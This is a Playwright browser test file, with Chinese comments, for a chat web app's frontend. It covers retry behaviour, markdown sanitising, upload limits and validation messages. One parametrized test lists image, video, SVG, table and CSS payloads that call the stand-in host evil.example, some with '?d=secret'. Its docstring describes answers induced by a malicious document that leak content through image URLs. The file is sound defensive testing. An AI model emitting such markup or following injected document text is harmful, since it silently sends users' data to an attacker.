"""W4-03 的网页部分：重试不读缓存、回答不加载外部资源、超限上传和校验错误能看到说明。真实浏览器、假模型、隔离数据。"""
import json

import pytest
from playwright.sync_api import expect

from briefly import config

from .flows import send

pytestmark = pytest.mark.browser


def chat_posts(page):
    """记下之后发出的 /chat 请求体。"""
    posts = []
    page.on("request", lambda r: posts.append(json.loads(r.post_data)) if r.method == "POST" and r.url.endswith("/chat") else None)
    return posts


def submit(page):
    """发送并等这一条回复结束；只等 /chat 自己的响应，不依赖其他请求的顺序。"""
    with page.expect_response(lambda r: r.url.endswith("/chat") and r.request.method == "POST"):
        page.locator("#send").click()
    expect(page.locator(".msg.assistant.pending")).to_have_count(0)
    expect(page.locator("#send")).to_be_enabled()


def test_retry_then_resend_unchanged_asks_for_a_fresh_answer(web_page):
    page = web_page
    page.locator('[data-tab="chat"]').click()
    posts = chat_posts(page)
    latest = send(page, "异常提醒：请总结支付联调情况")
    assert posts[-1]["fresh"] is False

    latest.locator("[data-retry]").click()
    expect(page.locator("#input")).to_have_value("异常提醒：请总结支付联调情况")
    submit(page)
    assert posts[-1]["text"] == "异常提醒：请总结支付联调情况" and posts[-1]["fresh"] is True

    # 标记只管这一次：再原样输入一遍就是普通重复
    page.locator("#input").fill("异常提醒：请总结支付联调情况")
    submit(page)
    assert posts[-1]["fresh"] is False


def test_retry_with_changed_text_is_a_normal_question(web_page):
    page = web_page
    page.locator('[data-tab="chat"]').click()
    posts = chat_posts(page)
    latest = send(page, "异常提醒：请总结支付联调情况")
    latest.locator("[data-retry]").click()
    page.locator("#input").fill("异常提醒：只总结支付部分")
    submit(page)
    assert posts[-1]["fresh"] is False


@pytest.mark.parametrize("markdown", [
    "![x](https://evil.example/leak.png?d=secret)",
    '<img src="https://evil.example/leak.png?d=secret">',
    '<video poster="https://evil.example/leak.png"></video>',
    '<svg><image href="https://evil.example/leak.png"/></svg>',
    '<table background="https://evil.example/leak.png"><tr><td>x</td></tr></table>',
    '<div style="background:url(https://evil.example/leak.png)">x</div>',
])
def test_answers_cannot_load_external_resources(web_page, markdown):
    """被恶意文档诱导的回答：图片地址能把内容带出去，不需要用户点击。回答和周报共用这个渲染函数。"""
    page = web_page
    requested = []
    page.on("request", lambda r: requested.append(r.url) if "evil.example" in r.url else None)
    html = page.evaluate("""(text) => {
        const box = document.createElement("div");
        box.innerHTML = renderMarkdown(text);
        document.body.appendChild(box);
        return box.innerHTML;
    }""", markdown)
    assert "evil.example" not in html
    assert requested == []


def test_links_in_answers_still_work(web_page):
    html = web_page.evaluate("renderMarkdown('[文档](https://example.com/a)')")
    assert 'href="https://example.com/a"' in html and 'target="_blank"' in html


def test_oversized_upload_shows_the_limit_not_a_network_error(web_page):
    """真实服务、真实浏览器：请求体没读完就返回 413 时，浏览器要能读到响应，而不是连接被重置。"""
    result = web_page.evaluate("""async (size) => {
        const form = new FormData();
        form.append("file", new File([new Uint8Array(size)], "big.txt"));
        try {
            await api("/materials/upload", { method: "POST", body: form });
            return "ok";
        } catch (err) {
            return err.message;
        }
    }""", (config.MAX_UPLOAD_MB + 2) * 1024 * 1024)
    assert "超过" in result and f"{config.MAX_UPLOAD_MB}MB" in result


def test_validation_error_names_the_field(web_page):
    result = web_page.evaluate("""async () => {
        try {
            await api("/todos", { method: "POST", json: { title: "x", due_date: "不是日期" } });
            return "ok";
        } catch (err) {
            return err.message;
        }
    }""")
    assert "提交的内容格式不正确" in result and "due_date" in result and "不是日期" not in result
